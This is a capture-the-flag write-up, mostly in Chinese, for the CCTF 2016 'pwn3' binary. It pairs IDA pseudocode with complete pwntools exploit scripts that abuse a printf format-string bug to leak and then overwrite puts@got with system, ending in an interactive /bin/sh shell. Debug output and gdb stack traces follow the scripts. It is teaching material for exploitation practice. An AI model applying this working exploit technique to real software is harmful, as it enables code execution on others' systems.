# CCTF 2016 pwn3

> CCTF 2016
>
> challenge name: pwn3
>
> file: pwn3, libc.so       貌似libc.so并无太大影响，估计在做题时并未给出
>
> original writeup: https://www.anquanke.com/post/id/83835  很详细，值得一看
>
> `pwn3.idb` provided

- hijack got using format string
- 利用格式化字符串漏洞劫持got表，最终使得程序执行`system(/bin/sh)`

**劫持思路见exploit Analysis一节，栈帧分析见gdb Post Analysis一节**



# checksec

```bash
$ checksec --file=pwn3
RELRO          STACK CANARY     NX          PIE     RPATH     RUNPATH     Symbols     FORTIFY Fortified  Fortifiable  FILE
Partial RELRO  No canary found  NX enabled  No PIE  No RPATH  No RUNPATH  88) Symbols   No    0          3            pwn3
```

- RELRO: Partial RELRO. RELRO部分开启

# IDA Analysis

- 分析主程序逻辑，注重宏观理解

```cpp
// IDA中显示的 main 伪c代码，格式已经过格式化
int __cdecl __noreturn main(int argc, const char** argv, const char** envp) {
    signed int v3;  // eax
    char v4[40];    // [esp+14h] [ebp-2Ch] BYREF
    int v5;         // [esp+3Ch] [ebp-4h]

    setbuf(stdout, 0);
    ask_username(v4);  // 这里会对输入的name 每个char-1
    ask_password(v4);  // 对于处理后的name，与sysbdmin对比，相同则welcome
    while (1) {
        while (1) {
            print_prompt();
            v3 = get_command();  // 输入三个字符，get return 1; put 2; dir 3
            v5 = v3;
            if (v3 != 2)
                break;
            put_file();  // get_command 中输入为 put，返回为2
        }
        if (v3 == 3) {
            show_dir();  // get_command 中输入为 dir，返回为3
        } else {
            if (v3 != 1)  // 如果用户输入的不在三种合法输入内，返回值将为4，则退出程序
                exit(1);
            get_file();  // get_command 中输入为 get，返回为1
        }
    }
}
```

- 大致浏览完main中被调用的函数(level-1 callee)之后（可以暂时不必看被调用函数调用的，level-2 callee），整个main逻辑基本上就了解了，其逻辑大致是：
  1. 登录，输入用户名，会对用户名是否正确做判断，用户名是确定的，计算出正确用户名即可通过用户名校验这一关
  2. 功能输入，三个字符：`"get", "put", "dir"`
     1. get: 调用`get_file()`，输入文件名，如果为`flag`则输出`too young, too simple`；遍历所有`file`结构体，如果有结构体的name字段与输入相同，则输出该文件的内容，否则输入第一个文件的文件内容。输出没有结束符。
     2. put: 调用`put_file()`，输入文件名，输入想要上传的文件名，会调用函数`get_input()`，然后输入文件内容，至多200B，同样调用`get_input()`，当前文件指针的`previous`域指向之前的`file_head`，然后`file_head`指向当前的文件指针。
     3. dir: 调用`show_dir()`，`show_dir()`中遍历所有的file结构体，将name字段追加到一个`1024`长的char数组`s`中。文件名之间没有分隔符分开，并且按照put的逆序输出，输出方式为`puts(s)`
- file结构体: `file->name 40B; file->content 200B, file->previous 4B`。



## vulnerability

- get: 调用的`get_file()`伪c代码如下

```c
int get_file()
{
  char dest[200]; // [esp+1Ch] [ebp-FCh] BYREF
  char s1[40]; // [esp+E4h] [ebp-34h] BYREF
  char *i; // [esp+10Ch] [ebp-Ch]

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", s1);
  if ( !strncmp(s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, s1) )
    {
      strcpy(dest, i + 40); // 获取file->content
      return printf(dest); // vulnerability
    }
  }
  return printf(dest); // vulnerability
}
```

`printf`函数直接用`dest`作参数，存在格式化字符串漏洞利用点

- `show_dir()`中存在`puts(s)`函数，存在格式化字符串漏洞利用点

```c
int show_dir()
{
  int v0; // eax
  char s[1024]; // [esp+14h] [ebp-414h] BYREF
  int i; // [esp+414h] [ebp-14h]
  int j; // [esp+418h] [ebp-10h]
  int v5; // [esp+41Ch] [ebp-Ch]

  v5 = 0;
  j = 0;
  bzero(s, 1024u);
  for ( i = file_head; i; i = *(_DWORD *)(i + 240) )// i指向file结构体，i+=240就是取file->previous
  {
    for ( j = 0; *(_BYTE *)(i + j); ++j )
    {
      v0 = v5++;
      s[v0] = *(_BYTE *)(i + j);                // 将文件名一个个char保存到s中，j遍历时，遇到 '\0' 则终止
    }
  }
  return puts(s);      // vulnerability        // 输出各个file结构体的name字段  
}
```





# exploit

- 封装部分交互逻辑为函数版：

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')

def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data

def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)

tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1) # 通过IDA分析得到的正确的用户名
sh.recvuntil('Name (ftp.hacker.server:Rainism):')
sh.sendline(name) # send name # 用计算得出的正确用户名，通过一开始的用户名校验

puts_got = pwn3.got['puts'] # get the addr of puts # 获取 puts 函数的got表项地址
log.success('puts got : ' + hex(puts_got)) # log
put('1111', b"%8$s" + p32(puts_got)) # 调用自定义的put函数 完成put交互
puts_addr = u32(get('1111')[:4]) # 获取puts函数的真实地址 # 调用自定义的函数get

# get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

# modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
# gdb.attach(sh)
sh.sendline('/bin/sh;')
sh.sendline('dir') # system('/bin/sh')
sh.interactive()
```

- 顺序逻辑版：

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'debug'
pwn3 = ELF('./pwn3')
sh = process('./pwn3')
name = ""
for i in "sysbdmin":
    name += chr(ord(i) - 1)  # 通过IDA分析得到的正确的用户名 # rxraclhm
sh.recvuntil('Name (ftp.hacker.server:Rainism):')
sh.sendline(name)  # send name # 用计算得出的正确用户名，通过一开始的用户名校验
# .got.plt:0804A028 off_804A028     dd offset puts          ; DATA XREF: _puts↑r
puts_got = pwn3.got['puts']  # get the addr of puts # 获取 puts 函数的got表项地址
log.success('puts got : ' + hex(puts_got))  # log

gdb.attach(sh) # gdb attach

# ====== step 1: put ====== # put file name 111, content b"%8$s" + p32(puts_got)
sh.sendline('put')
sh.recvuntil('please enter the name of the file you want to upload:')
sh.sendline('1111')
sh.recvuntil('then, enter the content:')
sh.sendline(b"%8$s" + p32(puts_got))
# ====== step 2: get ====== # get 1111, got actual addr of puts
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
sh.sendline('1111')
data = sh.recv()
puts_addr = u32(data[:4])  # 获取puts函数的真实地址
# ====== step 3: system_addr ====== get addr of system using LibcSearcher
libc = LibcSearcher("puts", puts_addr)  # 根据 puts 函数的真实地址，比对得出libc的版本(一般多个)
system_offset = libc.dump('system')  # 该版 libc system 函数的偏移量
puts_offset = libc.dump('puts')  # 该版 libc puts 函数的偏移量
system_addr = system_offset - puts_offset + puts_addr  # 该版 libc system 函数的真实地址
log.success('system actual addr = ' + hex(system_addr))  # log
# ====== step 4: put ====== modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr}) # 格式化字符串的偏移是 7，希望在 puts_got 地址处写入 system_addr 地址
print("payload:", payload, "\npayload:", payload.hex())
sh.sendline('put')
sh.recvuntil('please enter the name of the file you want to upload:')
sh.sendline('/bin/sh;')  # file name
sh.recvuntil('then, enter the content:')
sh.sendline(payload)  # file content
# ====== step 5: get ======
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
sh.sendline('/bin/sh;')  # file name
# ====== step 6: dir ======
sh.sendline('dir')  # system('/bin/sh')
sh.interactive()
```

## exploit Analysis

exploit的整体思路：

1. `put file->name=1111, file->content=b"%8$s" + p32(puts_got) `
2. `get 1111` : 调用`printf("%8$s" + p32(puts_got));`，获取到`puts`的真实地址
3. 使用`LibcSearcher`判断libc版本，从而得到`system`函数的真实地址
4. `put file->name=/bin/sh;, file->content=fmtstr_payload(7, {puts_got: system_addr})`，payload内容为，fmt str为第7个参数，想要把`puts_got`覆盖为`system_addr`。此时只是该文件内容为payload，`puts@got`并未被替换，即payload还未起效。
5. `get /bin/sh;`: 调用`printf(payload);`，使得`puts@got`覆盖为`system_addr`，即payload起效
6. `dir`: 原本应执行`puts(file->name)`，但因`puts@got`被替换成了`system`，实际执行的为`system(/bin/sh;1111)`

能够起效有几个关键点：

1. 存在`printf(s)`这样格式化字符串可被控制的地方，所以可以利用这一调用将`puts@got`覆盖为`system`
2. 存在`puts(file_names)`这样的调用，而`file->name`是逆序追加的，即后添加的先输出，文件名又是用户自己输入的，所以可以使用`/bin/sh;`这样的文件名



## output

```assembly
$ python exp.py  # 运行上述脚本
[DEBUG] PLT 0x80484a0 setbuf
[DEBUG] PLT 0x80484b0 strcmp
[DEBUG] PLT 0x80484c0 printf
[DEBUG] PLT 0x80484d0 bzero
[DEBUG] PLT 0x80484e0 fread
[DEBUG] PLT 0x80484f0 strcpy
[DEBUG] PLT 0x8048500 malloc
[DEBUG] PLT 0x8048510 puts
[DEBUG] PLT 0x8048520 __gmon_start__
[DEBUG] PLT 0x8048530 exit
[DEBUG] PLT 0x8048540 __libc_start_main
[DEBUG] PLT 0x8048550 __isoc99_scanf
[DEBUG] PLT 0x8048560 strncmp
[*] '/home/kali/CTF/pwn/CCTF2016pwn3/pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './pwn3' argv=[b'./pwn3'] : pid 32812
[DEBUG] Received 0x70 bytes:
    b'Connected to ftp.hacker.server\n'
    b'220 Serv-U FTP Server v6.4 for WinSock ready...\n'
    b'Name (ftp.hacker.server:Rainism):'
[DEBUG] Sent 0x9 bytes:
    b'rxraclhm\n'
[+] puts got : 0x804a028
[*] running in new terminal: /usr/bin/gdb -q  "./pwn3" 32812
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./pwn3" 32812']
[+] Waiting for debugger: Done
[DEBUG] Sent 0x4 bytes:
    b'put\n'
[DEBUG] Received 0xd bytes:
    b'welcome!\n'
    b'ftp>'
[DEBUG] Received 0x35 bytes:
    b'please enter the name of the file you want to upload:'
[DEBUG] Sent 0x5 bytes:
    b'1111\n'
[DEBUG] Received 0x18 bytes:
    b'then, enter the content:'
[DEBUG] Sent 0x9 bytes:
    00000000  25 38 24 73  28 a0 04 08  0a                        │%8$s│(···│·│
    00000009
[DEBUG] Sent 0x4 bytes:
    b'get\n'
[DEBUG] Received 0x4 bytes:
    b'ftp>'
[DEBUG] Received 0x24 bytes:
    b'enter the file name you want to get:'
[DEBUG] Sent 0x5 bytes:
    b'1111\n'
[DEBUG] Received 0x14 bytes:
    00000000  60 e4 d8 f7  26 85 04 08  36 85 04 08  40 cd d3 f7  │`···│&···│6···│@···│
    00000010  28 a0 04 08                                         │(···│
    00000014
[+] There are multiple libc that meet current constraints :
0 - libc6_2.31-8_i386
1 - libc6_2.31-7_i386
2 - libc6_2.31-9_i386
3 - libc6-i386_2.27-3ubuntu1.4_amd64
4 - libc6_2.26-0ubuntu2_amd64
5 - libc6-i386_2.13-20ubuntu5_amd64
6 - libc-2.31-4-x86
7 - libc-2.31-5-x86
8 - libc6_2.26-0ubuntu2.1_amd64
9 - libc6-i386_2.27-3ubuntu1.3_amd64
[+] Choose one : 0
[+] system actual addr = 0xf7d63040
payload: b'%48c%19$hhn%16c%20$hhn%150c%21$hhn%33c%22$hhnaaa)\xa0\x04\x08(\xa0\x04\x08*\xa0\x04\x08+\xa0\x04\x08'
payload: 253438632531392468686e253136632532302468686e25313530632532312468686e253333632532322468686e61616129a0040828a004082aa004082ba00408
[DEBUG] Sent 0x4 bytes:
    b'put\n'
[DEBUG] Received 0x4 bytes:
    b'ftp>'
[DEBUG] Received 0x35 bytes:
    b'please enter the name of the file you want to upload:'
[DEBUG] Sent 0x9 bytes:
    b'/bin/sh;\n'
[DEBUG] Received 0x18 bytes:
    b'then, enter the content:'
[DEBUG] Sent 0x41 bytes:
    00000000  25 34 38 63  25 31 39 24  68 68 6e 25  31 36 63 25  │%48c│%19$│hhn%│16c%│
    00000010  32 30 24 68  68 6e 25 31  35 30 63 25  32 31 24 68  │20$h│hn%1│50c%│21$h│
    00000020  68 6e 25 33  33 63 25 32  32 24 68 68  6e 61 61 61  │hn%3│3c%2│2$hh│naaa│
    00000030  29 a0 04 08  28 a0 04 08  2a a0 04 08  2b a0 04 08  │)···│(···│*···│+···│
    00000040  0a                                                  │·│
    00000041
[DEBUG] Received 0x4 bytes:
    b'ftp>'
[DEBUG] Sent 0x4 bytes:
    b'get\n'
[DEBUG] Received 0x24 bytes:
    b'enter the file name you want to get:'
[DEBUG] Sent 0x9 bytes:
    b'/bin/sh;\n'
[DEBUG] Sent 0x4 bytes:
    b'dir\n'
[*] Switching to interactive mode
[DEBUG] Received 0x10a bytes:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000020  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 d8  │    │    │    │   ·│
    00000030  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 04  │    │    │    │   ·│
    00000040  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000000d0  20 20 20 20  20 d8 20 20  20 20 20 20  20 20 20 20  │    │ ·  │    │    │
    000000e0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    000000f0  20 20 20 20  20 20 f4 61  61 61 29 a0  04 08 28 a0  │    │  ·a│aa)·│··(·│
    00000100  04 08 2a a0  04 08 2b a0  04 08                     │··*·│··+·│··│
    0000010a
                                               \xd8               \x04                                                                                                                                                    \xd8                                \xf4aaa)\xa0\x04(\xa0\x04*\xa[DEBUG] Received 0x4 bytes:
    b'ftp>'
ftp>
```



# gdb Post Analysis

> 使用gdb分析上述脚本运行过程中的栈帧变化，分析exploit起效的原因

运行exploit脚本，并`gdb.attach(sh)`，gdb内下断点：

```gdb
b printf
b puts
b system
```

- 在已经put了一个`file`结构体`file->name=1111; file->content= b"%8$s" + p32(puts_got) `之后，`get 1111`时，调用`printf("%8$s" + p32(puts_got))` 时的栈帧：

```assembly
gef➤  c # sh.sendline('get') sh.sendline('1111') 后，程序运行到了printf(dest)
───────────────────────────────────────── stack ────
0xff9ab98c│+0x0000: 0x080488a3  →  <get_file+173> leave          ← $esp
0xff9ab990│+0x0004: 0xff9ab9ac  →  0x73243825 # fmt str指针为 0xff9ab9ac # 故fmt str地址为fmt str指针所在位置的第7个参数位置处
0xff9ab994│+0x0008: 0x088ee1d8  →  0x73243825
0xff9ab998│+0x000c: 0x00000004
0xff9ab99c│+0x0010: 0xf7d2c9d8  →  0x00003787
0xff9ab9a0│+0x0014: 0xf7f046f4  →  0xf7d9c130  →  <_IO_cleanup+0> push ebp
0xff9ab9a4│+0x0018: 0x000007d4
0xff9ab9a8│+0x001c: 0xf7f03f20  →  0x00000000
───────────────────────────────────────── trace ────
[#0] 0xf7d72060 → __printf(format=0xff9ab9ac "%8$s(\240\004\b") 
[#1] 0x80488a3 → get_file()
[#2] 0x80486c9 → main()
gef➤
```

- fmt str地址为fmt str指针所在位置的第7个参数位置处，`%8$s`占用4B，故`p32(puts_got)`在fmt str指针所在位置的第8个参数处。
- 至此，利用 `puts@got` 获取到了 `puts` 函数真实地址。而后利用`LibcSearcher`库，得到`libc`版本，从而得到对应`system`函数的地址。

```assembly
[+] system actual addr = 0xf7d63040
```

## payload Analysis

- `payload = fmtstr_payload(7, {puts_got: system_addr})`表示格式化字符串的偏移是 7，希望在 `puts_got` 地址处写入 `system_addr` 地址。上面程序分析得到: `puts_got=0x804a028, system_addr=0xf7d63040`。亦即，在小端存储下，想要在`0x804a028`处写入`0x40`; `0x804a029`处写入`0x30`; `0x804a02a`处写入`0xd6`; `0x804a02b`处写入`0xf7`.

```c
payload: b'%48c%19$hhn%16c%20$hhn%150c%21$hhn%33c%22$hhnaaa)\xa0\x04\x08(\xa0\x04\x08*\xa0\x04\x08+\xa0\x04\x08'
payload: 253438632531392468686e253136632532302468686e25313530632532312468686e253333632532322468686e61616129a0040828a004082aa004082ba00408
```

- 上述`paylaod`意思上等同于: `%48c%19$hhn%16c%20$hhn%150c%21$hhn%33c%22$hhnaaa\x0804a029\x0804a028\x0804a02a\x0804a02b`
- 即覆盖`0x0804a029`为`0x30=48`; 覆盖`0x0804a028`为`0x40=48+16`;  覆盖`0x0804a02a`为`0xdc=48+16+150`; 覆盖`0x0804a02b`为`0xf7=48+16+150+33`。`aaa`用于pad, `%48c%19$hhn%16c%20$hhn%150c%21$hhn%33c%22$hhnaaa`总共48 char. 原本fmt str地址为fmt str指针所在位置的第7个参数位置处，而48 char占去12个参数的位置(32bit程序)，故欲覆盖地址所在位置的参数序号为`19=7+12`

## put and get  /bin/sh; 

- 使用上述paylaod的脚本片段如下，文件名为`/bin/sh;`，文件内容为payload，此时paylaod还未起效

```python
# ====== step 4: put ====== modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr}) # 格式化字符串的偏移是 7，希望在 puts_got 地址处写入 system_addr 地址
print("payload:", payload, "\npayload:", payload.hex())
sh.sendline('put')
sh.recvuntil('please enter the name of the file you want to upload:')
sh.sendline('/bin/sh;')  # file name
sh.recvuntil('then, enter the content:')
sh.sendline(payload)  # file content
```

- 令payload起效的脚本片段如下，先后输入`get`, `/bin/sh;`令程序调用`get_file()`内的语句`printf(payload);`，使得payload起效。step 5结束后，`puts@got`地址被覆盖为`system`函数的地址

```python
# ====== step 5: get ======
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
sh.sendline('/bin/sh;')  # file name
```

## call system using dir

- payload起效后，使用dir命令，让程序执行`show_dir()`函数内的`puts(s);`

```python
# ====== step 6: dir ======
sh.sendline('dir')  # system('/bin/sh')
```

- 此时的栈帧如下

```assembly
gef➤  c
Breakpoint 3, __libc_system (line=0xff9ab694 "/bin/sh;1111") at ../sysdeps/posix/system.c:199
199     ../sysdeps/posix/system.c: No such file or directory.
───────────────────────────────────────── stack ────
0xff9ab67c│+0x0000: 0x08048775  →  <show_dir+142> leave          ← $esp
0xff9ab680│+0x0004: 0xff9ab694  →  "/bin/sh;1111"
0xff9ab684│+0x0008: 0x00000400
0xff9ab688│+0x000c: 0xf7d26678  →  0x0000355b ("[5"?)
0xff9ab68c│+0x0010: 0x000000d9
0xff9ab690│+0x0014: 0xf7d2f778  →  0x72647800
0xff9ab694│+0x0018: "/bin/sh;1111"
0xff9ab698│+0x001c: "/sh;1111"
───────────────────────────────────────── trace ────
[#0] 0xf7d63040 → __libc_system(line=0xff9ab694 "/bin/sh;1111")
[#1] 0x8048775 → show_dir()
[#2] 0x80486d7 → main()
```

